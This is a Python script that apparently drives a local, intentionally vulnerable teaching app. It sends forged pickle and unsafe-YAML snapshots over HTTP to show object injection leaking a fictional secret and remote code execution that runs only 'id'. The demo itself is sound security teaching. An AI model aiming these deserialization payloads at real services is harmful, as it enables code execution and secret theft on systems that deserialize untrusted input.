"""One-shot demonstration of the deserialization escalation ladder (LOCAL DEMO ONLY).

Runs over real HTTP against the intentionally vulnerable application and prints the
escalation ladder through **both** deserializers: a forged snapshot accepted with no
integrity check, object-injection disclosure of the fictional integration secret, and
in-container code execution reaching ``os.popen('id')`` and the planted
``DEMO_SENTINEL``. The only command executed is the read-only ``id``. Exits non-zero
if the expected (deliberately insecure) outcomes do not hold.
"""

from __future__ import annotations

import os
import sys

import httpx

from picklejack.config import DEMO_SENTINEL, FICTIONAL_INTEGRATION_SECRET
from picklejack.domain.fixtures import GLOBEX_TOKEN
from picklejack.snapshots.attacker import (
    forged_pickle_snapshot,
    rce_pickle_snapshot,
    rce_yaml_snapshot,
    secret_pickle_snapshot,
    secret_yaml_snapshot,
)

BASE_URL = os.environ.get("PICKLEJACK_VULNERABLE_URL", "http://127.0.0.1:8001")

# (label, format, data) — reconstructed and printed in order.
STEPS: list[tuple[str, str, str]] = [
    ("forged pickle snapshot (accepted)", "pickle", forged_pickle_snapshot()),
    ("object injection → secret (pickle)", "pickle", secret_pickle_snapshot()),
    ("object injection → secret (yaml)", "yaml", secret_yaml_snapshot()),
    ("RCE os.popen('id') (pickle)", "pickle", rce_pickle_snapshot()),
    ("RCE os.popen('id') (yaml)", "yaml", rce_yaml_snapshot()),
]


def main() -> int:
    failures: list[str] = []
    with httpx.Client(base_url=BASE_URL, timeout=10.0) as client:
        print(f"picklejack VULNERABLE demo → {BASE_URL}\n")
        print("This app is intentionally insecure: it reconstructs objects from untrusted bytes.\n")
        print(f"{'ladder step':<38} | reconstructed output")
        print("-" * 100)

        results: dict[str, str] = {}
        for label, fmt, data in STEPS:
            response = client.post(
                "/workspace/import",
                headers={"Authorization": f"Bearer {GLOBEX_TOKEN}"},
                json={"format": fmt, "data": data},
            )
            response.raise_for_status()
            reconstructed = response.json()["reconstructed"].strip()
            results[label] = reconstructed
            print(f"{label:<38} | {reconstructed[:56]}")

        if FICTIONAL_INTEGRATION_SECRET not in results["object injection → secret (pickle)"]:
            failures.append("pickle object injection did not disclose the secret")
        if FICTIONAL_INTEGRATION_SECRET not in results["object injection → secret (yaml)"]:
            failures.append("yaml object injection did not disclose the secret")
        for label in ("RCE os.popen('id') (pickle)", "RCE os.popen('id') (yaml)"):
            if "uid=" not in results[label]:
                failures.append(f"{label}: os.popen('id') did not execute")
            if DEMO_SENTINEL not in results[label]:
                failures.append(f"{label}: the planted DEMO_SENTINEL was not reached")

    print()
    if failures:
        print("DEMO RESULT: FAIL")
        for item in failures:
            print(f"  - {item}")
        return 1
    print(
        "DEMO RESULT: the vulnerable app trusted forged snapshots, leaked the secret, and ran `id`"
    )
    print("through both pickle and unsafe YAML. Only `id` ran; state is unchanged; no egress.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
